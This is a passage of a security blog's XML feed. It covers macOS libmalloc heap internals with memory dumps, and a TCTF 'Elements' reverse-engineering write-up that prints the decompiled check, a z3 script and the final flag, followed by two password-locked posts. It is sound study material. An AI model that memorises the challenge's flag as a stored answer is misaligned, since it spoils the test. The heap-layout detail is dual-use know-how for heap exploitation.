0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
